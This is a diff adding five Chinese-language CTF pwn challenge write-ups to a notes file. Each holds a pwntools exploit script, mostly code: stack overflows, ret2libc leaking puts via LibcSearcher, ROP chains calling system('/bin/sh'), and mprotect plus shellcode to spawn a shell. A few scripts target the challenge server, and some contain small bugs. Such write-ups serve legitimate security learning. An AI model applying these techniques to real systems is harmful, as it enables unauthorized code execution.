@@ -142,3 +142,187 @@ p.sendline(payload)
 p.interactive()
 ```
 
+## 9 ciscn_2019_n_8
+
+可以发现如果var[13]是17就getshell
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+p = process('./pwn')
+def dbg():
+    gdb.attach(p)
+    pause()
+
+payload = p32(17)*14
+p.sendline(payload)
+p.interactive()
+```
+
+## 10 bjdctf_2020_babystack
+
+自定义输入长度，栈溢出
+
+```python
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+p = process('./pwn')
+def dbg():
+    gdb.attach(p)
+    pause()
+
+p.sendline(b'100')
+
+payload = b'a'*0x10+b'b'*0x8+p64(0x4006EA)
+p.sendline(payload)
+p.interactive()
+```
+
+## 11 ciscn_2019_c_1
+
+ret2libc，加密的地方可以溢出，可以在输入的地方输入一个'\0'绕开加密过程
+
+```python
+from pwn import*
+from LibcSearcher import*
+
+p=remote('node5.buuoj.cn',26071)
+#p = process('./pwn')
+elf=ELF('./pwn')
+
+main = 0x400B28
+pop_rdi = 0x400c83
+ret = 0x4006b9
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+
+p.sendlineafter('Input your choice!\n','1')
+offset = 0x50+8
+payload = b'\0'+b'a'*(offset-1)
+payload+=p64(pop_rdi)
+payload+=p64(puts_got)
+payload+=p64(puts_plt)
+payload+=p64(main)
+p.sendlineafter('Input your Plaintext to be encrypted\n',payload)
+p.recvline()
+p.recvline()
+puts_addr=u64(r.recvuntil('\n')[:-1].ljust(8,b'\0'))
+print(hex(puts_addr))
+
+libc = LibcSearcher('puts',puts_addr)
+Offset = puts_addr - libc.dump('puts')
+binsh = Offset+libc.dump('str_bin_sh')
+system = Offset+libc.dump('system')
+p.sendlineafter('Input your choice!\n','1')
+payload = b'\0'+b'a'*(offset-1)
+payload+=p64(ret)
+payload+=p64(pop_rdi)
+payload+=p64(binsh)
+payload+=p64(system)
+p.sendlineafter('Input your Plaintext to be encrypted\n',payload)
+
+p.interactive()
+```
+
+## 12 jarvisoj_level2_x64
+
+rdi传递binsh
+
+又是本地打不通，远程可以打通，不理解
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+p = process('./pwn')
+#p = remote('node5.buuoj.cn',28182)
+def dbg():
+    gdb.attach(p)
+    pause()
+
+pop_rdi = 0x00000000004006b3
+binsh = 0x600A90
+system = elf.plt['system']
+ret = 0x00000000004004a1
+p.recv()
+payload = b'b'*0x80+b'b'*8+p64(pop_rdi)+p64(binsh)+p64(system)
+p.sendline(payload)
+p.interactive()
+```
+
+## 13 get_started_3dsctf_2016
+
+- 通过mprotect()函数改内存为可读可写可执行
+
+- 加入read函数
+
+- 在read函数中构造shellcode
+
+至于为什么是0x80EB000而不是bss段的开头0x80EBF80。
+
+>  因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',25636)
+def dbg():
+    gdb.attach(p)
+    pause()
+
+pop_ret = 0x0804951D# 这里是一个有三个寄存器的pop_ret
+mprotect_addr = elf.sym['mprotect']
+mem_addr = 0x80EB000
+mem_size = 0x1000
+mem_proc = 0x7
+read_addr = elf.sym['read']
+
+# 调用mprotect函数
+payload = b'a'*0x38
+payload+=p32(mprotect_addr)
+payload+=p32(pop_ret)
+
+# 填充mprotect参数
+payload+=p32(mem_addr)
+payload+=p32(mem_size)
+payload+=p32(mem_proc)
+
+# 调用read函数
+payload+=p32(read_addr)
+payload+=p32(pop_ret)
+
+# 填充read参数
+payload+=p32(0)
+payload+=p32(mem_addr)
+payload+=p32(0x100)
+
+# read返回后跳转到shellcode所在地址
+payload+=p32(mem_addr)
+
+p.sendline(payload)
+
+payload2 = asm(shellcraft.sh())
+p.sendline(payload2)
+p.interactive()
+```
+
